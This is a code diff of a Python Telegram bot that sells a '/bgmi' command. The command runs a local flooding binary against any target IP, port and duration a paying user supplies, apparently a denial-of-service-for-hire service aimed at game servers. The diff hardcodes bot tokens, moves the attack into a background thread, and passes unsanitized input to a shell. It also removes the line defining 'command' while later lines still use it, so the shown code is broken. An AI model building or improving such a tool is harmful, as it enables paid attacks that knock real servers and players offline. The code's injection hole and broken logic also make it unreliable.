@@ -8,13 +8,19 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('8784009909:AAEFEctfrhmMRqjmeORUsVF_KoD-k05IMt8')
+bot = telebot.TeleBot('8633037899:AAHrL0xEQjd8ATwg-nBtD4COY-bGoveUKmA')
 
 # Admin user IDs
-admin_id = ["8400776382"]
+admin_id = ["5814552038"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
+
+# File to store free user IDs
+FREE_USER_FILE = "free_users.txt"
+
+# Dictionary to store free user credits
+free_user_credits = {}
 
 # File to store command logs
 LOG_FILE = "log.txt"
@@ -48,7 +54,6 @@ allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
-    admin_id = ["5935306519"]
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -302,23 +307,30 @@ def handle_bgmi(message):
             # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
-        command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
             if time > 600:
                 response = "Error: Time interval must be less than 600."
+                bot.reply_to(message, response)
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
-                process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
-                bot.reply_to(message, response)  # Notify the user that the attack is finished
+                
+                # Start the attack in a non-blocking thread
+                import threading
+                def run_attack():
+                    full_command = f"./bgmi {target} {port} {time} 500"
+                    subprocess.run(full_command, shell=True)
+                    response = f"BGMI Attack Finished ✅. Target: {target} Port: {port} Time: {time}"
+                    bot.reply_to(message, response)
+
+                threading.Thread(target=run_attack).start()
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            bot.reply_to(message, response)
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @mesh213")
 
